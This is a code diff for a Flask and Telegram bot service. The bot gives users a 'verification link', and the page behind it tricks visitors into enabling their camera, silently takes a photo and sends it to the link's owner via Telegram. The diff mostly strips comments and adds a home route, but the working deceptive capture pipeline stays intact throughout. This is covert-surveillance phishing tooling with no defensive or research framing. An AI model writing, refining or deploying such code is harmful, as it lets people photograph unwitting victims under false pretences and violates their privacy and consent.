@@ -4,7 +4,7 @@ import base64
 from io import BytesIO
 from datetime import datetime
 from flask import Flask, request, jsonify, render_template_string
-from telegram import Bot, Update
+from telegram import Bot
 from telegram.ext import Updater, CommandHandler
 
 # Configuration
@@ -22,9 +22,9 @@ db = {
 app = Flask(__name__)
 bot = Bot(token=TOKEN)
 
-# ======================
-# Web Interface
-# ======================
+@app.route('/')
+def home():
+    return "Telegram Bot Service Running"
 
 @app.route('/capture/<link_id>')
 def capture_page(link_id):
@@ -69,7 +69,6 @@ def capture_page(link_id):
                     status.textContent = 'Verification in progress...';
                     startBtn.style.display = 'none';
                     
-                    // Capture photo after 2 seconds
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = cameraFeed.videoWidth;
@@ -99,16 +98,11 @@ def capture_page(link_id):
     </html>
     ''', link_id=link_id)
 
-# ======================
-# API Endpoints
-# ======================
-
 @app.route('/save-capture/<link_id>', methods=['POST'])
 def save_capture(link_id):
     data = request.json
     image_data = data['photo'].split(',')[1]
     
-    # Store capture
     if link_id not in db['captures']:
         db['captures'][link_id] = []
     db['captures'][link_id].append({
@@ -116,7 +110,6 @@ def save_capture(link_id):
         'image_data': image_data
     })
 
-    # Send to Telegram
     owner_id = db['links'][link_id]['owner_id']
     bot.send_photo(
         chat_id=owner_id,
@@ -126,11 +119,7 @@ def save_capture(link_id):
 
     return jsonify({"status": "success"})
 
-# ======================
-# Telegram Bot
-# ======================
-
-def start_command(update: Update, context):
+def start_command(update, context):
     user_id = update.effective_user.id
     link_id = str(uuid.uuid4())
     
@@ -144,15 +133,10 @@ def start_command(update: Update, context):
         f"🔗 Your verification link:\n\n{DOMAIN}/capture/{link_id}"
     )
 
-# ======================
-# Deployment Setup
-# ======================
-
 def main():
     updater = Updater(TOKEN)
     updater.dispatcher.add_handler(CommandHandler('start', start_command))
     updater.start_polling()
-    
     app.run(host='0.0.0.0', port=PORT)
 
 if __name__ == '__main__':
